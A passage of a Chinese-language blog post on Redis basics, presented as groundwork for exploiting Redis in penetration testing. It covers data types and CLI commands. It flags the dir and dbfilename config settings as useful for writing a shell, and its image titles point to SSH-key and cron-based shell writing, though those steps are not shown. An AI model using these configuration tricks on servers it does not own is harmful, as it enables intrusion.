

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon/warning.png">
  <link rel="icon" href="/img/icon/warning.png">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="John Doe">
  <meta name="keywords" content="">
  
    <meta name="description" content="0X00 前言：之前一直说 NOSQL ，也看了不少文章对于未授权 NOSQL 的攻击案例，知道大致怎么用，但是自己一直没有尝试好好使用过，感觉对比 MYSQL 而言，我太轻视  NOSQL ，于是这次下定决心以 Redis 作为例子好好玩玩，特此记录备忘。 0X01 简介我们知道 NOSQL 和 MYSQL 的差距还是非常大的，他不再是关系型数据库(也就是说他不在存在表这种东西)，那他是什么呢？">
<meta property="og:type" content="article">
<meta property="og:title" content="Redis 基础梳理以及其在渗透测试中的利用">
<meta property="og:url" content="http://example.com/2018/11/08/Redis%20%E5%9F%BA%E7%A1%80%E6%A2%B3%E7%90%86%E4%BB%A5%E5%8F%8A%E5%85%B6%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="0X00 前言：之前一直说 NOSQL ，也看了不少文章对于未授权 NOSQL 的攻击案例，知道大致怎么用，但是自己一直没有尝试好好使用过，感觉对比 MYSQL 而言，我太轻视  NOSQL ，于是这次下定决心以 Redis 作为例子好好玩玩，特此记录备忘。 0X01 简介我们知道 NOSQL 和 MYSQL 的差距还是非常大的，他不再是关系型数据库(也就是说他不在存在表这种东西)，那他是什么呢？">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/hash%E7%BB%93%E6%9E%84.png">
<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/redis%20%E4%BF%A1%E6%81%AF.png">
<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/key%20%E4%BF%A1%E6%81%AF.png">
<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/redis%20%E5%86%99%E5%85%AC%E9%92%A51.png">
<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%94%9F%E6%88%90%E5%AF%86%E9%92%A5%E5%AF%B9.png">
<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%AF%BC%E5%87%BA%E4%B8%BA%E6%96%87%E4%BB%B6.png">
<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%86%99%E5%85%A5%E9%94%AE%E5%80%BC.png">
<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%94%B9%E5%8F%98%E5%AD%98%E5%82%A8%E8%B7%AF%E5%BE%84.png">
<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%88%90%E5%8A%9F%E6%97%A0%E5%AF%86%E7%A0%81%E7%99%BB%E5%85%A5.png">
<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%86%99%E5%85%A5%E7%9A%84%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9.png">
<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%AB%AF%E5%8F%A3%E7%9B%91%E5%90%AC.png">
<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%AE%BE%E7%BD%AE%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1.png">
<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%AE%BE%E7%BD%AE%20cron%20%E8%B7%AF%E5%BE%84.png">
<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%86%99shell.png">
<meta property="article:published_time" content="2018-11-08T22:09:18.000Z">
<meta property="article:modified_time" content="2025-01-24T15:19:09.101Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="Redis 备忘">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/hash%E7%BB%93%E6%9E%84.png">
  
  
  
  <title>Redis 基础梳理以及其在渗透测试中的利用 - Hexo</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  



  
<link rel="stylesheet" href="/css/macpanel.css">



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 60vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>K0rz3n&#39;s Blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>Home</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>Archives</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>Categories</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>Tags</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>About</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/banner/icemountain.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="Redis 基础梳理以及其在渗透测试中的利用"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2018-11-08 22:09" pubdate>
          November 8, 2018 pm
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          4.6k words
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          39 mins
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">Redis 基础梳理以及其在渗透测试中的利用</h1>
            
            
              <div class="markdown-body">
                
                <h2 id="0X00-前言："><a href="#0X00-前言：" class="headerlink" title="0X00 前言："></a><strong>0X00 前言：</strong></h2><p>之前一直说 NOSQL ，也看了不少文章对于未授权 NOSQL 的攻击案例，知道大致怎么用，但是自己一直没有尝试好好使用过，感觉对比 MYSQL 而言，我太轻视  NOSQL ，于是这次下定决心以 Redis 作为例子好好玩玩，特此记录备忘。</p>
<h2 id="0X01-简介"><a href="#0X01-简介" class="headerlink" title="0X01 简介"></a><strong>0X01 简介</strong></h2><p>我们知道 NOSQL 和 MYSQL 的差距还是非常大的，他不再是关系型数据库(也就是说他不在存在表这种东西)，那他是什么呢？实际上它是以键值对的形式存放数据的，很像 json 的形式，并且与关系型数据库相比 Redis 能存储的数据类型也多得多，它不仅能存储字符串型的数据，还能存储其他四种类型：list，set，zset(有序)，hash （就算是和同类 NOSQL 数据库 memcached 相比他也强大的多，因为 memcached 仅能支持比较单一的 key-value ），它支持数据在硬盘的持久化(EDB 快照或者是 AOF 的形式)，还有一个特点就是他的所有操作都是原子性的，也就是说要么成功执行，要么就完全不执行。</p>
<span id="more"></span>

<h2 id="0X02-小试牛刀"><a href="#0X02-小试牛刀" class="headerlink" title="0X02 小试牛刀"></a><strong>0X02 小试牛刀</strong></h2><h3 id="1-设置一个值并获取"><a href="#1-设置一个值并获取" class="headerlink" title="1.设置一个值并获取"></a><strong>1.设置一个值并获取</strong></h3><pre><code class="hljs">127.0.0.1:6379&gt; set mykey abc
OK
127.0.0.1:6379&gt; get mykey 
&quot;abc&quot;
</code></pre>
<h3 id="2-查看配置并修改选项"><a href="#2-查看配置并修改选项" class="headerlink" title="2.查看配置并修改选项"></a><strong>2.查看配置并修改选项</strong></h3><pre><code class="hljs">config get xxx (如果是 * 表示获取全部)
config set xxx yyy 
</code></pre>
<p><strong>注意：下面的配置项在我们的写 shell 的过程中比较有用</strong></p>
<p><strong>(1）获取 RDB 文件的存放位置</strong></p>
<pre><code class="hljs">config get dir
</code></pre>
<p><strong>(2) 获取 RDB 文件的文件名(默认为dump.rdb)</strong></p>
<pre><code class="hljs">config get dbfilename 
</code></pre>
<p><strong>(3) 判断 AOF 是否开启</strong></p>
<pre><code class="hljs">config get appendonly
</code></pre>
<p><strong>（4）获取 AOF 的文件名(默认appendonly.aof)</strong></p>
<pre><code class="hljs">config get appendfilename
</code></pre>
<p><strong>(5)获取 AOF 文件的备份方式(always everysec no)</strong></p>
<pre><code class="hljs">config get appendfsync
</code></pre>
<h2 id="0X03-数据类型"><a href="#0X03-数据类型" class="headerlink" title="0X03 数据类型"></a><strong>0X03 数据类型</strong></h2><h3 id="1-String-类型"><a href="#1-String-类型" class="headerlink" title="1.String 类型"></a><strong>1.String 类型</strong></h3><p>String 是最基本的类型，这个类型是二进制安全的，也就是说能存储任何类型的数据，比如说 jpg 图片或者序列化的对象，string 类型的值最大能存储 512MB。</p>
<pre><code class="hljs">127.0.0.1:6379&gt; set name K0rz3n
OK
127.0.0.1:6379&gt; get name
&quot;K0rz3n&quot;
127.0.0.1:6379&gt;
</code></pre>
<h3 id="2-Hash-类型"><a href="#2-Hash-类型" class="headerlink" title="2.Hash 类型"></a><strong>2.Hash 类型</strong></h3><p><strong>应用场景：</strong></p>
<p>我们要存储一个用户信息对象数据，其中包括用户ID、用户姓名、年龄和生日，通过用户ID我们希望获取该用户的姓名或者年龄或者生日；</p>
<p><strong>实现方式：</strong></p>
<p>Redis的Hash实际是内部存储的Value为一个HashMap，并提供了直接存取这个Map成员的接口。如图所示，Key是用户ID, value是一个Map。这个Map的key是成员的属性名，value是属性值。这样对数据的修改和存取都可以直接通过其内部Map的Key(Redis里称内部Map的key为field), 也就是通过 key(用户ID) + field(属性标签) 就可以操作对应属性数据。</p>
<p><strong>如图所示：</strong></p>
<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/hash%E7%BB%93%E6%9E%84.png" srcset="/img/loading.gif" lazyload alt="此处输入图片的描述"></p>
<p><strong>常用命令：</strong></p>
<pre><code class="hljs">hget/hset/hgetall/hmset
</code></pre>
<p><strong>示例代码：</strong></p>
<pre><code class="hljs">127.0.0.1:6379&gt; hmset 1 name K0rz3n age 20
OK
127.0.0.1:6379&gt; hget 1 name
&quot;K0rz3n&quot;
127.0.0.1:6379&gt; hget 1 age
&quot;20&quot;
127.0.0.1:6379&gt;
</code></pre>
<h3 id="3-List-类型"><a href="#3-List-类型" class="headerlink" title="3.List 类型"></a><strong>3.List 类型</strong></h3><p>Redis 列表是简单的字符串列表，按照插入顺序排序。你可以添加一个元素到列表的头部（左边）或者尾部（右边）,本质上是一个双向链表，列表最多可存储 2的32次方 - 1 个元素</p>
<p><strong>应用场景：</strong></p>
<p>Redis list的应用场景非常多，也是Redis最重要的数据结构之一，比如twitter的关注列表，粉丝列表等都可以用Redis的list结构来实现；</p>
<p><strong>常用命令：</strong></p>
<pre><code class="hljs">lpush/rpush/lpop/rpop/lrange
</code></pre>
<p><strong>示例代码：</strong></p>
<pre><code class="hljs">127.0.0.1:6379&gt; lpush list K0rz3n
(integer) 1
127.0.0.1:6379&gt; lpush list name
(integer) 2
127.0.0.1:6379&gt; rpush list age
(integer) 3
127.0.0.1:6379&gt; lrange list 0 10
1) &quot;name&quot;
2) &quot;K0rz3n&quot;
3) &quot;age&quot;
127.0.0.1:6379&gt;
</code></pre>
<h3 id="4-Set-类型"><a href="#4-Set-类型" class="headerlink" title="4.Set 类型"></a><strong>4.Set 类型</strong></h3><p><strong>应用场景：</strong></p>
<p>Redis set对外提供的功能与list类似是一个列表的功能，特殊之处在于set是可以自动排重的，当你需要存储一个列表数据，又不希望出现重复数据时，set是一个很好的选择，并且set提供了判断某个成员是否在一个set集合内的重要接口，这个也是list所不能提供的；</p>
<p><strong>实现方式：</strong></p>
<p>set 的内部实现是一个 value永远为null的HashMap，实际就是通过计算hash的方式来快速排重的，这也是set能提供判断一个成员是否在集合内的原因。</p>
<p><strong>常用命令：</strong></p>
<pre><code class="hljs">sadd/spop/smembers/sunion
</code></pre>
<p><strong>示例代码：</strong></p>
<pre><code class="hljs">127.0.0.1:6379&gt; sadd set K0rz3n
(integer) 1
127.0.0.1:6379&gt; sadd set name
(integer) 1
127.0.0.1:6379&gt; sadd set age
(integer) 1
127.0.0.1:6379&gt; sadd set name
(integer) 0
127.0.0.1:6379&gt; smembers set
1) &quot;age&quot;
2) &quot;K0rz3n&quot;
3) &quot;name&quot;
</code></pre>
<h3 id="5-ZSet-Sorted-set-类型"><a href="#5-ZSet-Sorted-set-类型" class="headerlink" title="5.ZSet(Sorted set )类型"></a><strong>5.ZSet(Sorted set )类型</strong></h3><p><strong>应用场景：</strong></p>
<p>Redis sorted set的使用场景与set类似，区别是set不是自动有序的，而sorted set可以通过用户额外提供一个优先级(score)的参数来为成员排序，并且是插入有序的，即自动排序。当你需要一个有序的并且不重复的集合列表，那么可以选择sorted set数据结构，比如twitter 的public timeline可以以发表时间作为score来存储，这样获取时就是自动按时间排好序的。</p>
<p><strong>实现方式：</strong></p>
<p>Redis sorted set的内部使用HashMap和跳跃表(SkipList)来保证数据的存储和有序，HashMap里放的是成员到score的映射，而跳跃表里存放的是所有的成员，排序依据是HashMap里存的score,使用跳跃表的结构可以获得比较高的查找效率，并且在实现上比较简单。</p>
<p><strong>常用命令：</strong></p>
<pre><code class="hljs">zadd/zrange/zrem/zcard
</code></pre>
<p><strong>示例代码：</strong></p>
<pre><code class="hljs">127.0.0.1:6379&gt; zadd zset 0 K0rz3n
(integer) 1
127.0.0.1:6379&gt; zadd zset 0 name
(integer) 1
127.0.0.1:6379&gt; zadd zset 0 age
(integer) 1
127.0.0.1:6379&gt; zadd zset 0 name
(integer) 0
127.0.0.1:6379&gt; zrangebyscore zset 0 10
1) &quot;K0rz3n&quot;
2) &quot;age&quot;
3) &quot;name&quot;
</code></pre>
<h2 id="0X04-Redis-常用命令"><a href="#0X04-Redis-常用命令" class="headerlink" title="0X04 Redis 常用命令"></a><strong>0X04 Redis 常用命令</strong></h2><h3 id="1-PING-命令"><a href="#1-PING-命令" class="headerlink" title="1.PING 命令"></a><strong>1.PING 命令</strong></h3><p>ping 命令查看是否连接 Redis 服务端成功</p>
<pre><code class="hljs">127.0.0.1:6379&gt; ping
PONG
</code></pre>
<h3 id="2-有关-key-的命令"><a href="#2-有关-key-的命令" class="headerlink" title="2.有关 key 的命令"></a><strong>2.有关 key 的命令</strong></h3><h4 id="1-del-删除键"><a href="#1-del-删除键" class="headerlink" title="1.del 删除键"></a><strong>1.del 删除键</strong></h4><pre><code class="hljs">127.0.0.1:6379&gt; set name K0rz3n
OK
127.0.0.1:6379&gt; del name
(integer) 1
</code></pre>
<p>命令执行成功后输出 (integer) 1，否则将输出 (integer) 0</p>
<h4 id="2-dump-序列化键"><a href="#2-dump-序列化键" class="headerlink" title="2.dump 序列化键"></a><strong>2.dump 序列化键</strong></h4><p>dump 序列化给定的键，并返回序列化后的值</p>
<pre><code class="hljs">127.0.0.1:6379&gt; set name K0rz3n
OK
127.0.0.1:6379&gt; dump name
&quot;\x00\x06K0rz3n\a\x00R\xb7\x87H^\xd5B\n&quot;
</code></pre>
<h4 id="3-exists-检查键是否存在"><a href="#3-exists-检查键是否存在" class="headerlink" title="3.exists 检查键是否存在"></a><strong>3.exists 检查键是否存在</strong></h4><pre><code class="hljs">127.0.0.1:6379&gt; exists name
(integer) 1
</code></pre>
<h4 id="4-type-返回key-的存储类型"><a href="#4-type-返回key-的存储类型" class="headerlink" title="4.type 返回key 的存储类型"></a><strong>4.type 返回key 的存储类型</strong></h4><pre><code class="hljs">127.0.0.1:6379&gt; type name
string
</code></pre>
<h4 id="5-keys-查找所有符合给定模式的-Key"><a href="#5-keys-查找所有符合给定模式的-Key" class="headerlink" title="5.keys 查找所有符合给定模式的 Key"></a><strong>5.keys 查找所有符合给定模式的 Key</strong></h4><pre><code class="hljs">127.0.0.1:6379&gt; keys n*
1) &quot;naddfgfd&quot;
2) &quot;naaaa&quot;
3) &quot;name&quot;
</code></pre>
<h3 id="2-有关-String-的命令"><a href="#2-有关-String-的命令" class="headerlink" title="2.有关 String 的命令"></a><strong>2.有关 String 的命令</strong></h3><h4 id="1-getrange-截取字符串"><a href="#1-getrange-截取字符串" class="headerlink" title="1.getrange 截取字符串"></a><strong>1.getrange 截取字符串</strong></h4><pre><code class="hljs">127.0.0.1:6379&gt; getrange name 0 2
&quot;K0r&quot;
</code></pre>
<h4 id="2-strlen-返回-key-存储的字符串的长度"><a href="#2-strlen-返回-key-存储的字符串的长度" class="headerlink" title="2.strlen 返回 key 存储的字符串的长度"></a><strong>2.strlen 返回 key 存储的字符串的长度</strong></h4><pre><code class="hljs">127.0.0.1:6379&gt; strlen name
(integer) 6
</code></pre>
<h4 id="3-append-追加字符串"><a href="#3-append-追加字符串" class="headerlink" title="3.append 追加字符串"></a><strong>3.append 追加字符串</strong></h4><pre><code class="hljs">127.0.0.1:6379&gt; append name _is_not_a_hacker
(integer) 22
127.0.0.1:6379&gt; get name
&quot;K0rz3n_is_not_a_hacker&quot;
</code></pre>
<h4 id="4-mget-获取所有给定的-Key-的值"><a href="#4-mget-获取所有给定的-Key-的值" class="headerlink" title="4.mget 获取所有给定的 Key 的值"></a><strong>4.mget 获取所有给定的 Key 的值</strong></h4><pre><code class="hljs">127.0.0.1:6379&gt; mget name mykey
1) &quot;K0rz3n_is_not_a_hacker&quot;
2) &quot;abc&quot;
</code></pre>
<h4 id="5-mset-设置一个或者多个-key-value"><a href="#5-mset-设置一个或者多个-key-value" class="headerlink" title="5.mset 设置一个或者多个 key-value"></a><strong>5.mset 设置一个或者多个 key-value</strong></h4><pre><code class="hljs">127.0.0.1:6379&gt; mset name xiaoqiang age 20
OK
127.0.0.1:6379&gt; mget name age
1) &quot;xiaoqiang&quot;
2) &quot;20&quot;
</code></pre>
<h3 id="3-有关-Hash-的命令"><a href="#3-有关-Hash-的命令" class="headerlink" title="3.有关 Hash 的命令"></a><strong>3.有关 Hash 的命令</strong></h3><h4 id="1-hmset-设置一个或者多个-field-value"><a href="#1-hmset-设置一个或者多个-field-value" class="headerlink" title="1.hmset 设置一个或者多个 field-value"></a><strong>1.hmset 设置一个或者多个 field-value</strong></h4><pre><code class="hljs">127.0.0.1:6379&gt; hmset people name K0rz3n age 20 school xd
OK
</code></pre>
<h4 id="2-hgetall-获取给定键值的-hash-表内容"><a href="#2-hgetall-获取给定键值的-hash-表内容" class="headerlink" title="2.hgetall 获取给定键值的 hash 表内容"></a><strong>2.hgetall 获取给定键值的 hash 表内容</strong></h4><pre><code class="hljs">127.0.0.1:6379&gt; hgetall people
1) &quot;name&quot;
2) &quot;K0rz3n&quot;
3) &quot;age&quot;
4) &quot;20&quot;
5) &quot;school&quot;
6) &quot;xd&quot;
</code></pre>
<h4 id="3-hexists-判断指定的-field-是否存在"><a href="#3-hexists-判断指定的-field-是否存在" class="headerlink" title="3.hexists 判断指定的 field 是否存在"></a><strong>3.hexists 判断指定的 field 是否存在</strong></h4><pre><code class="hljs">127.0.0.1:6379&gt; hexists people name
(integer) 1
127.0.0.1:6379&gt; hexists people hh
(integer) 0
</code></pre>
<h4 id="4-hget-获取指定-field-的值"><a href="#4-hget-获取指定-field-的值" class="headerlink" title="4.hget 获取指定 field 的值"></a><strong>4.hget 获取指定 field 的值</strong></h4><pre><code class="hljs">127.0.0.1:6379&gt; hget people name
&quot;K0rz3n&quot;
</code></pre>
<h4 id="5-hlen-获取-hash-表中字段的数量"><a href="#5-hlen-获取-hash-表中字段的数量" class="headerlink" title="5.hlen 获取 hash 表中字段的数量"></a><strong>5.hlen 获取 hash 表中字段的数量</strong></h4><pre><code class="hljs">127.0.0.1:6379&gt; hlen people
(integer) 3
</code></pre>
<h4 id="6-hkeys-获取所有的键值"><a href="#6-hkeys-获取所有的键值" class="headerlink" title="6.hkeys 获取所有的键值"></a><strong>6.hkeys 获取所有的键值</strong></h4><pre><code class="hljs">127.0.0.1:6379&gt; hkeys people
1) &quot;name&quot;
2) &quot;age&quot;
3) &quot;school&quot;
</code></pre>
<h4 id="7-hvals-获取所有的值"><a href="#7-hvals-获取所有的值" class="headerlink" title="7.hvals 获取所有的值"></a><strong>7.hvals 获取所有的值</strong></h4><pre><code class="hljs">127.0.0.1:6379&gt; hvals people
1) &quot;K0rz3n&quot;
2) &quot;20&quot;
3) &quot;xd&quot;
</code></pre>
<h3 id="4-有关-List-的命令"><a href="#4-有关-List-的命令" class="headerlink" title="4.有关 List 的命令"></a><strong>4.有关 List 的命令</strong></h3><h4 id="1-llen-获取列表的长度"><a href="#1-llen-获取列表的长度" class="headerlink" title="1.llen 获取列表的长度"></a><strong>1.llen 获取列表的长度</strong></h4><pre><code class="hljs">127.0.0.1:6379&gt; llen list
(integer) 3
</code></pre>
<h4 id="2-lindex-通过索引获取列表中的元素"><a href="#2-lindex-通过索引获取列表中的元素" class="headerlink" title="2.lindex 通过索引获取列表中的元素"></a><strong>2.lindex 通过索引获取列表中的元素</strong></h4><pre><code class="hljs">127.0.0.1:6379&gt; lindex list 1
&quot;K0rz3n&quot;
127.0.0.1:6379&gt; lindex list 0
&quot;name&quot;
127.0.0.1:6379&gt; lindex list 2
&quot;age&quot;
</code></pre>
<h4 id="3-lrange-获取列表指定范围内的元素"><a href="#3-lrange-获取列表指定范围内的元素" class="headerlink" title="3.lrange 获取列表指定范围内的元素"></a><strong>3.lrange 获取列表指定范围内的元素</strong></h4><pre><code class="hljs">127.0.0.1:6379&gt; lrange list 0 2
1) &quot;name&quot;
2) &quot;K0rz3n&quot;
3) &quot;age&quot;
</code></pre>
<h4 id="4-linster-在元素的前或后插入元素"><a href="#4-linster-在元素的前或后插入元素" class="headerlink" title="4.linster 在元素的前或后插入元素"></a><strong>4.linster 在元素的前或后插入元素</strong></h4><p><strong>在前方插入</strong></p>
<pre><code class="hljs">127.0.0.1:6379&gt; linsert list before name new_name
(integer) 4
127.0.0.1:6379&gt; lrange list 0 3
1) &quot;new_name&quot;
2) &quot;name&quot;
3) &quot;K0rz3n&quot;
4) &quot;age&quot;
</code></pre>
<p><strong>在后方插入</strong></p>
<pre><code class="hljs">127.0.0.1:6379&gt; linsert list after name old_name
(integer) 5
127.0.0.1:6379&gt; lrange list 0 4
1) &quot;new_name&quot;
2) &quot;name&quot;
3) &quot;old_name&quot;
4) &quot;K0rz3n&quot;
5) &quot;age&quot;
</code></pre>
<h4 id="5-lpush-将一个或者多个值插入列表头部"><a href="#5-lpush-将一个或者多个值插入列表头部" class="headerlink" title="5.lpush 将一个或者多个值插入列表头部"></a><strong>5.lpush 将一个或者多个值插入列表头部</strong></h4><pre><code class="hljs">127.0.0.1:6379&gt; lpush list hh
(integer) 6
127.0.0.1:6379&gt; lrange list 0 5
1) &quot;hh&quot;
2) &quot;new_name&quot;
3) &quot;name&quot;
4) &quot;old_name&quot;
5) &quot;K0rz3n&quot;
6) &quot;age&quot;
</code></pre>
<h4 id="6-lpop-移除并获取列表第一个元素"><a href="#6-lpop-移除并获取列表第一个元素" class="headerlink" title="6.lpop 移除并获取列表第一个元素"></a><strong>6.lpop 移除并获取列表第一个元素</strong></h4><pre><code class="hljs">127.0.0.1:6379&gt; lpop list
&quot;hh&quot;
127.0.0.1:6379&gt; lrange list 0 10
1) &quot;new_name&quot;
2) &quot;name&quot;
3) &quot;old_name&quot;
4) &quot;K0rz3n&quot;
5) &quot;age&quot;
</code></pre>
<h4 id="7-rpush-将一个或者多个值插入列表尾部"><a href="#7-rpush-将一个或者多个值插入列表尾部" class="headerlink" title="7.rpush 将一个或者多个值插入列表尾部"></a><strong>7.rpush 将一个或者多个值插入列表尾部</strong></h4><pre><code class="hljs">127.0.0.1:6379&gt; rpush list hh
(integer) 6
127.0.0.1:6379&gt; lrange list 0 10
1) &quot;new_name&quot;
2) &quot;name&quot;
3) &quot;old_name&quot;
4) &quot;K0rz3n&quot;
5) &quot;age&quot;
6) &quot;hh&quot;
</code></pre>
<h4 id="8-rpop-移除并获取列表最后一个元素"><a href="#8-rpop-移除并获取列表最后一个元素" class="headerlink" title="8.rpop 移除并获取列表最后一个元素"></a><strong>8.rpop 移除并获取列表最后一个元素</strong></h4><pre><code class="hljs">127.0.0.1:6379&gt; rpop list
&quot;hh&quot;
127.0.0.1:6379&gt; lrange list 0 10
1) &quot;new_name&quot;
2) &quot;name&quot;
3) &quot;old_name&quot;
4) &quot;K0rz3n&quot;
5) &quot;age&quot;
</code></pre>
<h3 id="5-有关-Set-的命令"><a href="#5-有关-Set-的命令" class="headerlink" title="5.有关 Set 的命令"></a><strong>5.有关 Set 的命令</strong></h3><h4 id="1-sadd-向集合中添加一个或者多个成员"><a href="#1-sadd-向集合中添加一个或者多个成员" class="headerlink" title="1.sadd 向集合中添加一个或者多个成员"></a><strong>1.sadd 向集合中添加一个或者多个成员</strong></h4><pre><code class="hljs">127.0.0.1:6379&gt; sadd set1 K0rz3n new old age
(integer) 4
</code></pre>
<h4 id="2-scard-返回集合的成员数"><a href="#2-scard-返回集合的成员数" class="headerlink" title="2.scard 返回集合的成员数"></a><strong>2.scard 返回集合的成员数</strong></h4><pre><code class="hljs">127.0.0.1:6379&gt; scard set1
(integer) 4
</code></pre>
